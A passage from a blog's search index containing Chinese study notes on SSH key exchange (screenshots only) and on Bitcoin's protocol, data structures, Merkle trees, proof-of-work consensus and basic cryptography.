title="服务端到客户端的算法协商"></a>服务端到客户端的算法协商</h3><p><img src="/../pic/Pasted%20image%2020240722151212.png"></p><h2 id="（3）密钥交换"><a href="#（3）密钥交换" class="headerlink" title="（3）密钥交换"></a>（3）密钥交换</h2><h3 id="客户端到服务端密钥交换"><a href="#客户端到服务端密钥交换" class="headerlink" title="客户端到服务端密钥交换"></a>客户端到服务端密钥交换</h3><p><img src="/../pic/Pasted%20image%2020240722151314.png"></p><h3 id="服务端到客户端密钥交换-newkeys"><a href="#服务端到客户端密钥交换-newkeys" class="headerlink" title="服务端到客户端密钥交换+newkeys"></a>服务端到客户端密钥交换+newkeys</h3><p><img src="/../pic/Pasted%20image%2020240722151617.png"></p><h3 id="客户端到服务端的newkeys"><a href="#客户端到服务端的newkeys" class="headerlink" title="客户端到服务端的newkeys"></a>客户端到服务端的newkeys</h3><p><img src="/../pic/Pasted%20image%2020240722151748.png"></p>]]></content>
    
    
    <categories>
      
      <category>网络协议</category>
      
      <category>SSH</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SSH</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03 BTC-协议</title>
    <link href="/2024/07/21/03%20BTC-%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/07/21/03%20BTC-%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="1-货币问题"><a href="#1-货币问题" class="headerlink" title="1. 货币问题"></a>1. 货币问题</h1><h2 id="简单的签名货币的问题"><a href="#简单的签名货币的问题" class="headerlink" title="简单的签名货币的问题"></a>简单的签名货币的问题</h2><ul><li>简单的通过非对称加密进行验证。</li><li>重复花费。</li></ul><h3 id="中心化问题"><a href="#中心化问题" class="headerlink" title="中心化问题"></a>中心化问题</h3><h1 id="2-解决双花攻击"><a href="#2-解决双花攻击" class="headerlink" title="2. 解决双花攻击"></a>2. 解决双花攻击</h1><h1 id="3-货币发行"><a href="#3-货币发行" class="headerlink" title="3. 货币发行"></a>3. 货币发行</h1><h3 id="铸币交易"><a href="#铸币交易" class="headerlink" title="铸币交易"></a>铸币交易</h3><p>说明：block reward，凭空产生，不用说明币的来源。</p><p>收益：50 BTC 每年减半。</p><ul><li>争夺记账权叫挖矿。</li></ul><p>交易：在交易过程中，需要用发起转账的用户对于交易进行签名，并且说明花费的比特币的来源。</p><h1 id="4-区块信息"><a href="#4-区块信息" class="headerlink" title="4. 区块信息"></a>4. 区块信息</h1><h2 id="区块头"><a href="#区块头" class="headerlink" title="区块头"></a>区块头</h2><ul><li>协议</li><li>前一个区块头的HASH。</li><li>交易的默克尔根HASH。</li><li>target，目标值。</li><li>Nonce，随机数值。</li></ul><h2 id="区块体"><a href="#区块体" class="headerlink" title="区块体"></a>区块体</h2><ul><li>交易列表。</li></ul><h1 id="5-非对称密码学知识"><a href="#5-非对称密码学知识" class="headerlink" title="5. 非对称密码学知识"></a>5. 非对称密码学知识</h1><ul><li>公钥加密，私钥解密。</li></ul><h1 id="6-分布式共识"><a href="#6-分布式共识" class="headerlink" title="6. 分布式共识"></a>6. 分布式共识</h1><ul><li>一个节点是不诚实的的异步无上界的网络，公式是不可信的。</li><li>一致性、可容忍性、分布式</li></ul><h1 id="7-共识协议"><a href="#7-共识协议" class="headerlink" title="7.共识协议"></a>7.共识协议</h1><p>前提：大部分节点诚实的，少部分是恶意的。</p><h3 id="基于投票的问题"><a href="#基于投票的问题" class="headerlink" title="基于投票的问题"></a>基于投票的问题</h3><ul><li>谁投票</li><li>效率</li><li>女巫攻击，伪造大量的假节点，进行恶意投票。</li></ul><h3 id="基于算力的共识机制"><a href="#基于算力的共识机制" class="headerlink" title="基于算力的共识机制"></a>基于算力的共识机制</h3><h4 id="不接受区块"><a href="#不接受区块" class="headerlink" title="不接受区块"></a>不接受区块</h4><ul><li>区块链分叉</li><li>交易有问题</li><li>nonce不符合target的要求</li></ul><h4 id="接受区块"><a href="#接受区块" class="headerlink" title="接受区块"></a>接受区块</h4><ul><li>最长合法链</li></ul><h4 id="记账权的区块"><a href="#记账权的区块" class="headerlink" title="记账权的区块"></a>记账权的区块</h4><p>说明：只有算力强的矿工或者矿主才能够拥有记账权，尝试成功nonc值才能够打包区块。</p><ul><li>个人的算力基本是固定的，算力越强，基本的权重也就越高。</li><li>可以防范女巫攻击，跟用户多少无直接关系，跟算力大小直接相关。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>02 BTC-数据结构</title>
    <link href="/2024/07/21/02%20BTC-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    <url>/2024/07/21/02%20BTC-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="1-区块关系-链表形式"><a href="#1-区块关系-链表形式" class="headerlink" title="1. 区块关系-链表形式"></a>1. 区块关系-链表形式</h1><h3 id="区块格式"><a href="#区块格式" class="headerlink" title="区块格式"></a>区块格式</h3><ul><li>前一个HASH</li><li>本区块的区块信息。</li><li>二者合并取HASH为本区块的HASH值。</li></ul><h1 id="2-默克尔树"><a href="#2-默克尔树" class="headerlink" title="2. 默克尔树"></a>2. 默克尔树</h1><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li>验证数据的完整性。</li><li>交易的组成形式为默克尔树。</li><li>根哈希值在block header里面。</li></ul><h3 id="验证交易的可信性"><a href="#验证交易的可信性" class="headerlink" title="验证交易的可信性"></a>验证交易的可信性</h3><p><img src="/../pic/Pasted%20image%2020240711184141.png"></p><p>说明：</p><ul><li>轻节点具有交易的默克尔树的跟哈希。</li><li>只用提供交易路径上的哈希值，即可计算是否与根哈希值符合。</li><li>其中区块中的两个哈希值，表示两个哈希值的哈希值。</li></ul><h3 id="证明区块不存在区块中"><a href="#证明区块不存在区块中" class="headerlink" title="证明区块不存在区块中"></a>证明区块不存在区块中</h3><p>操作：对于所有的交易HASH都排序，比特币没有排序。</p><h1 id="3-区块内容"><a href="#3-区块内容" class="headerlink" title="3. 区块内容"></a>3. 区块内容</h1><h3 id="block-header"><a href="#block-header" class="headerlink" title="block header"></a>block header</h3><ul><li>协议</li><li>前一个区块头的HASH。</li><li>交易的默克尔根HASH。</li><li>target，目标值。</li><li>Nonce，随机数值。</li></ul><h3 id="block-body"><a href="#block-body" class="headerlink" title="block body"></a>block body</h3><ul><li>包含交易信息。</li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>01 比特币中的密码学原理</title>
    <link href="/2024/07/21/01%20%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86/"/>
    <url>/2024/07/21/01%20%E6%AF%94%E7%89%B9%E5%B8%81%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="1-哈希函数"><a href="#1-哈希函数" class="headerlink" title="1.哈希函数"></a>1.哈希函数</h1><h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ul><li>collision resistance：哈希碰撞十分困难。</li><li>hiding：即不可逆的性质。</li><li>puzzle friendly：雪崩效应。</li></ul><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li>生成摘要，做完整性验证。</li><li>数字签名</li><li>数字信封，验证信息。</li></ul><h1 id="2-对称加密"><a href="#2-对称加密" class="headerlink" title="2.对称加密"></a>2.对称加密</h1><h3 id="性质-1"><a href="#性质-1" class="headerlink" title="性质"></a>性质</h3><ul><li>密钥传输需要在安全的条件，密钥分发不便。</li><li></li></ul><h3 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h3><p>- </p><h1 id="3-非对称加密"><a href="#3-非对称加密" class="headerlink" title="3.非对称加密"></a>3.非对称加密</h1><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>好的随机源，防止生成的随机数的重复。</li></ul><h3 id="性质-2"><a href="#性质-2" class="headerlink" title="性质"></a>性质</h3><ul><li>已知公钥，生成私钥是十分困难。</li></ul><h3 id="作用-2"><a href="#作用-2" class="headerlink" title="作用"></a>作用</h3><ul><li>使用公私密钥对，进行加密与验证。</li></ul><h1 id="4-公私钥对的生成"><a href="#4-公私钥对的生成" class="headerlink" title="4.公私钥对的生成"></a>4.公私钥对的生成</h1><p><a href="https://www.cnblogs.com/kumata/p/10477369.html">比特币公私钥对生成</a></p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>BTC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BTC</tag>
      
      <tag>BlockChain</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
